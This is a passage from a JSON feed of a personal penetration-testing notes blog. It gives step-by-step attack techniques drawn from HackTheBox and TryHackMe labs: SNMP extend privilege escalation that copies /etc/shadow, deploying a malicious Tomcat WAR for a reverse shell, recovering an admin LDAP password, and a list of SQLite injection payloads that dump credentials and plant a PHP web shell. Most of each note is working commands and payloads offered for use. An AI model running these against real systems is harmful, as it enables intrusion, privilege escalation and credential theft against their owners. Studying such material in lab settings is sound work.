class=\"s\">'fileToUpload'</span><span class=\"p\">:</span> <span class=\"p\">(</span><span class=\"n\">wav_filename</span><span class=\"p\">,</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">wav_filename</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)),</span>    <span class=\"s\">'submit'</span><span class=\"p\">:</span> <span class=\"p\">(</span><span class=\"bp\">None</span><span class=\"p\">,</span> <span class=\"s\">'Process It!'</span><span class=\"p\">)</span>    <span class=\"p\">}</span>  <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"n\">post</span><span class=\"p\">(</span><span class=\"n\">url</span><span class=\"p\">,</span> <span class=\"n\">files</span><span class=\"o\">=</span><span class=\"n\">files</span><span class=\"p\">,</span> <span class=\"n\">proxies</span><span class=\"o\">=</span><span class=\"n\">proxies</span><span class=\"p\">)</span>  <span class=\"n\">sql_response</span> <span class=\"o\">=</span> <span class=\"n\">re</span><span class=\"p\">.</span><span class=\"n\">findall</span><span class=\"p\">(</span><span class=\"s\">'&lt;h3&gt;Our understanding.+&lt;h3&gt;'</span><span class=\"p\">,</span> <span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">text</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">]</span>  <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">sql_response</span><span class=\"p\">)</span><span class=\"n\">generate_wav</span><span class=\"p\">(</span><span class=\"n\">query</span><span class=\"p\">)</span><span class=\"n\">send_file</span><span class=\"p\">()</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/a.i.-exploiting/bra.i.nsmasher-presentation#presentation\">BRA.I.NSMASHER Presentation - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/08/ai",
            
            
            
            
            
            "date_published": "2022-06-08T00:00:00+08:00",
            "date_modified": "2022-06-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/02/snmp-extended-script",
            "title": "SNMP Extended Script",
            "summary": "SNMP Extended Script",
            "content_text": "OverviewAttacker can do privesc if it can gain access to SNMP extensions.Environment Setup  SNMP extension enabled using custom script and low privileged user has write access to custom scripts directory.[root@pit ~]# cat /etc/snmp/snmpd.conf | grep extendextend monitoring /usr/bin/monitor[root@pit ~]# [root@pit ~]# cat /usr/bin/monitor #!/bin/bashfor script in /usr/local/monitoring/check*shdo    /bin/bash $scriptdone[root@pit ~]# [root@pit ~]# getfacl /usr/local/monitoring/getfacl: Removing leading '/' from absolute path names# file: usr/local/monitoring/# owner: root# group: rootuser::rwxuser:michelle:-wxgroup::rwxmask::rwxother::---[root@pit ~]# Steps  Create malicious scriptecho -n '#!/bin/bash\\ncat /etc/shadow &gt; /tmp/shadow.txt' &gt; /usr/local/monitoring/check_evil.sh  Trigger SNMP extension# 10.10.10.241 - victim IPsnmpbulkwalk -On -r1 -v2c -c public 10.10.10.241 1Reference  HTB Pit",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can do privesc if it can gain access to SNMP extensions.</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>SNMP extension enabled using custom script and low privileged user has write access to custom scripts directory.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[</span>root@pit ~]# <span class=\"nb\">cat</span> /etc/snmp/snmpd.conf | <span class=\"nb\">grep </span>extendextend monitoring /usr/bin/monitor<span class=\"o\">[</span>root@pit ~]# <span class=\"o\">[</span>root@pit ~]# <span class=\"nb\">cat</span> /usr/bin/monitor <span class=\"c\">#!/bin/bash</span><span class=\"k\">for </span>script <span class=\"k\">in</span> /usr/local/monitoring/check<span class=\"k\">*</span>sh<span class=\"k\">do</span>    /bin/bash <span class=\"nv\">$script</span><span class=\"k\">done</span><span class=\"o\">[</span>root@pit ~]# <span class=\"o\">[</span>root@pit ~]# getfacl /usr/local/monitoring/getfacl: Removing leading <span class=\"s1\">'/'</span> from absolute path names<span class=\"c\"># file: usr/local/monitoring/</span><span class=\"c\"># owner: root</span><span class=\"c\"># group: root</span>user::rwxuser:michelle:-wxgroup::rwxmask::rwxother::---<span class=\"o\">[</span>root@pit ~]# </code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Create malicious script</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"nt\">-n</span> <span class=\"s1\">'#!/bin/bash\\ncat /etc/shadow &gt; /tmp/shadow.txt'</span> <span class=\"o\">&gt;</span> /usr/local/monitoring/check_evil.sh</code></pre></div></div><ul>  <li>Trigger SNMP extension</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 10.10.10.241 - victim IP</span>snmpbulkwalk <span class=\"nt\">-On</span> <span class=\"nt\">-r1</span> <span class=\"nt\">-v2c</span> <span class=\"nt\">-c</span> public 10.10.10.241 1</code></pre></div></div><h2 id=\"reference\">Reference</h2><ul>  <li>HTB Pit</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/02/snmp-extended-script",
            
            
            
            "tags": ["snmp","privesc"],
            
            "date_published": "2022-06-02T00:00:00+08:00",
            "date_modified": "2022-06-02T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/28/uploading-malicuous-jar-or-war-file",
            "title": "Uploading malicuous JAR or WAR file",
            "summary": "Uploading malicuous JAR or WAR file",
            "content_text": "OverviewAttacker can deploy malicuous JAR or WAR file to gain RCE.Versions Tested  Tomcat 9.0.31  Tomcat 7.0.88 (Microsoft Windows Server 2012 R2 Standard)Steps - CLI  Generate war file. See tomcat part on [[Reverse Shell and Web Shells]]  Uploadcurl -u 'webdev:password123' --upload-file evil.war 'http://10.10.163.51:8080/manager/text/deploy?path=/evil.war'  Verifycurl -u 'webdev:password123' 'http://10.10.163.51:8080/manager/text/list'  Open netcat listener on attacker machine  Executecurl -u 'webdev:password123' http://10.10.163.51:8080/evil.warSteps - GUI  Ensure you have access to host manager app  Create JAR file. See [[Reverse Shell and Web Shells]]  Upload it via manager app and deploy  Open netcat listener  Access the servlet and enjoycurl -u 'bob:bubbles' http://thm:1234/evilAlernatives  You can also upload jsp file instead of war file  Tomcat deployer  HTB jerry - uploading cmd.jsp",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>Attacker can deploy malicuous JAR or WAR file to gain RCE.</p><h1 id=\"versions-tested\">Versions Tested</h1><ul>  <li>Tomcat 9.0.31</li>  <li>Tomcat 7.0.88 (Microsoft Windows Server 2012 R2 Standard)</li></ul><h1 id=\"steps---cli\">Steps - CLI</h1><ul>  <li>Generate war file. See tomcat part on [[Reverse Shell and Web Shells]]</li>  <li>Upload</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-u</span> <span class=\"s1\">'webdev:password123'</span> <span class=\"nt\">--upload-file</span> evil.war <span class=\"s1\">'http://10.10.163.51:8080/manager/text/deploy?path=/evil.war'</span></code></pre></div></div><ul>  <li>Verify</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-u</span> <span class=\"s1\">'webdev:password123'</span> <span class=\"s1\">'http://10.10.163.51:8080/manager/text/list'</span></code></pre></div></div><ul>  <li>Open netcat listener on attacker machine</li>  <li>Execute</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-u</span> <span class=\"s1\">'webdev:password123'</span> http://10.10.163.51:8080/evil.war</code></pre></div></div><h1 id=\"steps---gui\">Steps - GUI</h1><ul>  <li>Ensure you have access to host manager app</li>  <li>Create JAR file. See [[Reverse Shell and Web Shells]]</li>  <li>Upload it via manager app and deploy</li></ul><p><img src=\"/spindel/assets/Uploading%20malicuous%20JAR%20or%20WAR%20file/B3786FC8-1BE8-49F3-8D7C-D7D5577D73D9.png\" alt=\"\" /></p><ul>  <li>Open netcat listener</li>  <li>Access the servlet and enjoy</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl -u 'bob:bubbles' http://thm:1234/evil</code></pre></div></div><h1 id=\"alernatives\">Alernatives</h1><ul>  <li>You can also upload <a href=\"https://www.youtube.com/watch?v=yTHtLi9YZ2s&amp;t=1050s\">jsp</a> file instead of war file</li></ul><p><img src=\"/spindel/assets/Uploading%20malicuous%20JAR%20or%20WAR%20file/3D882918-7ECC-4D4C-8D20-0FEDF14E4C45.png\" alt=\"\" /></p><ul>  <li><a href=\"https://github.com/mgeeky/tomcatWarDeployer\">Tomcat deployer</a></li>  <li><a href=\"https://www.youtube.com/watch?v=PJeBIey8gc4&amp;t=1362s\">HTB jerry</a> - uploading cmd.jsp</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/28/uploading-malicuous-jar-or-war-file",
            
            
            
            "tags": ["devops","tomcat","java","rce","foothold"],
            
            "date_published": "2022-05-28T00:00:00+08:00",
            "date_modified": "2022-05-28T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/24/decyrpting-admin-password-using-dnspy-debug",
            "title": "Decyrpting Admin password using DNSpy debug",
            "summary": "Decyrpting Admin password using DNSpy debug",
            "content_text": "OverviewAttacker can get admin password via decompiled .NET app from a misconfigured SMB share.Environment Setup  HqkLdap.exe - .NET app downloaded from SMB share  Windows box to decompile the app  Low privileged creds to navigate on running app over the networkSteps  Explore app and gather LDAP settings&gt;setdir c:\\program files\\hqk\\ldapCurrent directory set to ldap&gt;listUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY[1]   HqkLdap.exe[2]   Ldap.confCurrent Directory: ldap&gt;runquery 2Invalid database configuration found. Please contact your system administrator&gt;showquery 2Domain=nest.localPort=389BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=localUser=AdministratorPassword=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=  Transfer HqkLdap.exe to windows box  Create txt file and paste the LDAP config gathered above  Download dnSpy and decompile app  Run debugger and step through each process until you see the decryption part for the admin password  You can now use the credentials with psexecReferences  HTB Nest",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can get admin password via decompiled .NET app from a misconfigured SMB share.</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li><code class=\"language-plaintext highlighter-rouge\">HqkLdap.exe</code> - .NET app downloaded from SMB share</li>  <li>Windows box to decompile the app</li>  <li>Low privileged creds to navigate on running app over the network</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Explore app and gather LDAP settings</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&gt;</span>setdir c:<span class=\"se\">\\p</span>rogram files<span class=\"se\">\\h</span>qk<span class=\"se\">\\l</span>dapCurrent directory <span class=\"nb\">set </span>to ldap<span class=\"o\">&gt;</span>listUse the query ID numbers below with the RUNQUERY <span class=\"nb\">command </span>and the directory names with the SETDIR <span class=\"nb\">command </span>QUERY FILES IN CURRENT DIRECTORY<span class=\"o\">[</span>1]   HqkLdap.exe<span class=\"o\">[</span>2]   Ldap.confCurrent Directory: ldap<span class=\"o\">&gt;</span>runquery 2Invalid database configuration found. Please contact your system administrator<span class=\"o\">&gt;</span>showquery 2<span class=\"nv\">Domain</span><span class=\"o\">=</span>nest.local<span class=\"nv\">Port</span><span class=\"o\">=</span>389<span class=\"nv\">BaseOu</span><span class=\"o\">=</span><span class=\"nv\">OU</span><span class=\"o\">=</span>WBQ Users,OU<span class=\"o\">=</span>Production,DC<span class=\"o\">=</span>nest,DC<span class=\"o\">=</span><span class=\"nb\">local</span><span class=\"nv\">User</span><span class=\"o\">=</span>Administrator<span class=\"nv\">Password</span><span class=\"o\">=</span>yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4<span class=\"o\">=</span></code></pre></div></div><ul>  <li>Transfer <code class=\"language-plaintext highlighter-rouge\">HqkLdap.exe</code> to windows box</li>  <li>Create txt file and paste the LDAP config gathered above</li>  <li>Download <a href=\"https://github.com/dnSpy/dnSpy\">dnSpy</a> and decompile app</li></ul><p><img src=\"/spindel/assets/Decyrpting%20Admin%20password%20using%20DNSpy%20debug/91469A27-CCC3-4850-ADAB-B91EE820BB2E.png\" alt=\"\" /></p><ul>  <li>Run debugger and step through each process until you see the decryption part for the admin password</li></ul><p><img src=\"/spindel/assets/Decyrpting%20Admin%20password%20using%20DNSpy%20debug/A08CFDDB-A099-4111-8FD3-E53F3C515355.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Decyrpting%20Admin%20password%20using%20DNSpy%20debug/A962D76D-5848-4A06-BE28-CBCC3A042C18.png\" alt=\"\" /></p><ul>  <li>You can now use the credentials with <code class=\"language-plaintext highlighter-rouge\">psexec</code></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.youtube.com/watch?v=tDbVw6uGx8g\">HTB Nest</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/24/decyrpting-admin-password-using-dnspy-debug",
            
            
            
            "tags": ["windows","re","privesc","foothold","dotnet"],
            
            "date_published": "2022-05-24T00:00:00+08:00",
            "date_modified": "2022-05-24T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/22/sql-injection-sqlite",
            "title": "SQL Injection - SQLite",
            "summary": "SQL Injection - SQLite",
            "content_text": "Databasessqlite_masterQuick Detection-- check versionuser=foo' and 1=2 union select all 1,2,3,sqlite_version();--&amp;password=abcReading a filesqlite&gt;sqlite&gt; CREATE TABLE pwn.data (data TEXT);sqlite&gt; .tablesdata      pwn.datasqlite&gt; .import /etc/passwd datasqlite&gt; select * from data;root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/usr/bin/nologin............sqlite&gt; .tablesdata       pwn.data   pwn.shell  shell    sqlite&gt; DROP TABLE pwn.shell;Payloads-- getting table namesuser=foo' UNION SELECT group_concat(tbl_name),1,2,3 FROM sqlite_master;--&amp;password=abcuser=foo' UNION SELECT group_concat(tbl_name),1,2,3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';--&amp;password=ab-- extracting column namesuser=foo' UNION SELECT sql,2,3,4 from sqlite_master where name='users';--&amp;password=abc-- getting a username and a passworduser=foo' UNION SELECT name,2,3,password from users--&amp;password=abcuser=foo' UNION SELECT name,2,3,password from users limit 2 offset 10--&amp;password=abc-- get info for lucas washingtonuser=foo' UNION SELECT name,2,3,password from users where name like '%lucas_%'--&amp;password=abc-- planting a php file?id=bob’; ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘&lt;? system($_GET[‘cmd’]); ?&gt;’;--Reference  PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub  Injecting SQLite database based application",
            "content_html": "<h2 id=\"databases\">Databases</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlite_master</code></pre></div></div><h2 id=\"quick-detection\">Quick Detection</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">-- check version</span><span class=\"k\">user</span><span class=\"o\">=</span><span class=\"n\">foo</span><span class=\"s1\">' and 1=2 union select all 1,2,3,sqlite_version();--&amp;password=abc</span></code></pre></div></div><h2 id=\"reading-a-file\">Reading a file</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"k\">data</span> <span class=\"p\">(</span><span class=\"k\">data</span> <span class=\"nb\">TEXT</span><span class=\"p\">);</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"p\">.</span><span class=\"n\">tables</span><span class=\"k\">data</span>      <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"k\">data</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"p\">.</span><span class=\"n\">import</span> <span class=\"o\">/</span><span class=\"n\">etc</span><span class=\"o\">/</span><span class=\"n\">passwd</span> <span class=\"k\">data</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"k\">select</span> <span class=\"o\">*</span> <span class=\"k\">from</span> <span class=\"k\">data</span><span class=\"p\">;</span><span class=\"n\">root</span><span class=\"p\">:</span><span class=\"n\">x</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">:</span><span class=\"n\">root</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"n\">root</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"n\">bin</span><span class=\"o\">/</span><span class=\"n\">bash</span><span class=\"n\">bin</span><span class=\"p\">:</span><span class=\"n\">x</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">:</span><span class=\"n\">bin</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"n\">bin</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"n\">usr</span><span class=\"o\">/</span><span class=\"n\">bin</span><span class=\"o\">/</span><span class=\"n\">nologin</span><span class=\"p\">......</span><span class=\"p\">......</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"p\">.</span><span class=\"n\">tables</span><span class=\"k\">data</span>       <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"k\">data</span>   <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"n\">shell</span>  <span class=\"n\">shell</span>    <span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"k\">DROP</span> <span class=\"k\">TABLE</span> <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"n\">shell</span><span class=\"p\">;</span></code></pre></div></div><h1 id=\"payloads\">Payloads</h1><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">-- getting table names</span><span class=\"k\">user</span><span class=\"o\">=</span><span class=\"n\">foo</span><span class=\"s1\">' UNION SELECT group_concat(tbl_name),1,2,3 FROM sqlite_master;--&amp;password=abcuser=foo'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"n\">group_concat</span><span class=\"p\">(</span><span class=\"n\">tbl_name</span><span class=\"p\">),</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span> <span class=\"k\">FROM</span> <span class=\"n\">sqlite_master</span> <span class=\"k\">WHERE</span> <span class=\"k\">type</span><span class=\"o\">=</span><span class=\"s1\">'table'</span> <span class=\"k\">and</span> <span class=\"n\">tbl_name</span> <span class=\"k\">NOT</span> <span class=\"k\">like</span> <span class=\"s1\">'sqlite_%'</span><span class=\"p\">;</span><span class=\"c1\">--&amp;password=ab</span><span class=\"c1\">-- extracting column names</span><span class=\"k\">user</span><span class=\"o\">=</span><span class=\"n\">foo</span><span class=\"s1\">' UNION SELECT sql,2,3,4 from sqlite_master where name='</span><span class=\"n\">users</span><span class=\"s1\">';--&amp;password=abc-- getting a username and a passworduser=foo'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"n\">name</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"n\">password</span> <span class=\"k\">from</span> <span class=\"n\">users</span><span class=\"c1\">--&amp;password=abc</span><span class=\"k\">user</span><span class=\"o\">=</span><span class=\"n\">foo</span><span class=\"s1\">' UNION SELECT name,2,3,password from users limit 2 offset 10--&amp;password=abc-- get info for lucas washingtonuser=foo'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"n\">name</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"n\">password</span> <span class=\"k\">from</span> <span class=\"n\">users</span> <span class=\"k\">where</span> <span class=\"n\">name</span> <span class=\"k\">like</span> <span class=\"s1\">'%lucas_%'</span><span class=\"c1\">--&amp;password=abc</span><span class=\"c1\">-- planting a php file</span><span class=\"o\">?</span><span class=\"n\">id</span><span class=\"o\">=</span><span class=\"n\">bob</span><span class=\"err\">’</span><span class=\"p\">;</span> <span class=\"n\">ATTACH</span> <span class=\"k\">DATABASE</span> <span class=\"err\">‘</span><span class=\"o\">/</span><span class=\"n\">var</span><span class=\"o\">/</span><span class=\"n\">www</span><span class=\"o\">/</span><span class=\"n\">lol</span><span class=\"p\">.</span><span class=\"n\">php</span><span class=\"err\">’</span> <span class=\"k\">AS</span> <span class=\"n\">lol</span><span class=\"p\">;</span> <span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">lol</span><span class=\"p\">.</span><span class=\"n\">pwn</span> <span class=\"p\">(</span><span class=\"n\">dataz</span> <span class=\"nb\">text</span><span class=\"p\">);</span> <span class=\"k\">INSERT</span> <span class=\"k\">INTO</span> <span class=\"n\">lol</span><span class=\"p\">.</span><span class=\"n\">pwn</span> <span class=\"p\">(</span><span class=\"n\">dataz</span><span class=\"p\">)</span> <span class=\"k\">VALUES</span> <span class=\"p\">(</span><span class=\"err\">‘</span><span class=\"o\">&lt;?</span> <span class=\"k\">system</span><span class=\"p\">(</span><span class=\"err\">$</span><span class=\"n\">_GET</span><span class=\"p\">[</span><span class=\"err\">‘</span><span class=\"n\">cmd</span><span class=\"err\">’</span><span class=\"p\">]);</span> <span class=\"o\">?&gt;</span><span class=\"err\">’</span><span class=\"p\">;</span><span class=\"c1\">--</span></code></pre></div></div><h2 id=\"reference\">Reference</h2><ul>  <li><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md\">PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub</a></li>  <li><a href=\"https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf\">Injecting SQLite database based application</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/22/sql-injection-sqlite",
            
            
            
            "tags": ["sqli","db","enum"],
            
            "date_published": "2022-05-22T00:00:00+08:00",
            "date_modified": "2022-05-22T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/22/dangerous-functions",
            "title": "Dangerous Functions",
            "summary": "Dangerous Functions",
            "content_text": "PHP EvalSample usage:eval('$x = (5-1);');echo($x); // outputs 4Malicuous usage:eval('echo exec(\\'whoami\\');')eval('echo exec(\\'ls -l /home/alice\\');')  How eval() in php can be dangerous in web application’s security? - Information Security Stack ExchangeOther PHP Functionsexecshell_execsystempassthrupopenUseful Configurations# pin you to a specific directoryopen_basedirCommands# checks what dangerous functions exposedpython2 ~/data/tools/dfunc-bypasser.py --url http://htb/utility-scripts/info.phpReferences  Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes  Dangerous PHP Functions · GitHub",
            "content_html": "<h2 id=\"php-eval\">PHP Eval</h2><p>Sample usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'$x = (5-1);'</span><span class=\"p\">);</span><span class=\"k\">echo</span><span class=\"p\">(</span><span class=\"nv\">$x</span><span class=\"p\">);</span> <span class=\"c1\">// outputs 4</span></code></pre></div></div><p>Malicuous usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'whoami\\');'</span><span class=\"p\">)</span><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'ls -l /home/alice\\');'</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li><a href=\"https://security.stackexchange.com/questions/179375/how-eval-in-php-can-be-dangerous-in-web-applications-security\">How eval() in php can be dangerous in web application’s security? - Information Security Stack Exchange</a></li></ul><h2 id=\"other-php-functions\">Other PHP Functions</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>execshell_execsystempassthrupopen</code></pre></div></div><h2 id=\"useful-configurations\">Useful Configurations</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># pin you to a specific directory</span>open_basedir</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># checks what dangerous functions exposed</span>python2 ~/data/tools/dfunc-bypasser.py <span class=\"nt\">--url</span> http://htb/utility-scripts/info.php</code></pre></div></div><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://alionder.net/dangerous-php-functions/\">Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes</a></li>  <li><a href=\"https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720\">Dangerous PHP Functions · GitHub</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/22/dangerous-functions",
            
            
            
            
            
            "date_published": "2022-05-22T00:00:00+08:00",
            "date_modified": "2022-05-22T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/20/dangerous-functions",
            "title": "Dangerous Functions",
            "summary": "Dangerous Functions",
            "content_text": "PHP EvalSample usage:eval('$x = (5-1);');echo($x); // outputs 4Malicuous usage:eval('echo exec(\\'whoami\\');')eval('echo exec(\\'ls -l /home/alice\\');')  How eval() in php can be dangerous in web application’s security? - Information Security Stack ExchangeOther PHP Functionsexecshell_execsystempassthrupopenUseful Configurations# pin you to a specific directoryopen_basedirCommands# checks what dangerous functions exposedpython2 ~/data/tools/dfunc-bypasser.py --url http://htb/utility-scripts/info.phpReferences  Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes  Dangerous PHP Functions · GitHub",
            "content_html": "<h2 id=\"php-eval\">PHP Eval</h2><p>Sample usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'$x = (5-1);'</span><span class=\"p\">);</span><span class=\"k\">echo</span><span class=\"p\">(</span><span class=\"nv\">$x</span><span class=\"p\">);</span> <span class=\"c1\">// outputs 4</span></code></pre></div></div><p>Malicuous usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'whoami\\');'</span><span class=\"p\">)</span><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'ls -l /home/alice\\');'</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li><a href=\"https://security.stackexchange.com/questions/179375/how-eval-in-php-can-be-dangerous-in-web-applications-security\">How eval() in php can be dangerous in web application’s security? - Information Security Stack Exchange</a></li></ul><h2 id=\"other-php-functions\">Other PHP Functions</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>execshell_execsystempassthrupopen</code></pre></div></div><h2 id=\"useful-configurations\">Useful Configurations</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># pin you to a specific directory</span>open_basedir</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># checks what dangerous functions exposed</span>python2 ~/data/tools/dfunc-bypasser.py <span class=\"nt\">--url</span> http://htb/utility-scripts/info.php</code></pre></div></div><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://alionder.net/dangerous-php-functions/\">Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes</a></li>  <li><a href=\"https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720\">Dangerous PHP Functions · GitHub</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/20/dangerous-functions",
            
            
            
            
            
            "date_published": "2022-05-20T00:00:00+08:00",
            "date_modified": "2022-05-20T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/19/nuxeo",
            "title": "Nuxeo",
            "summary": "Nuxeo",
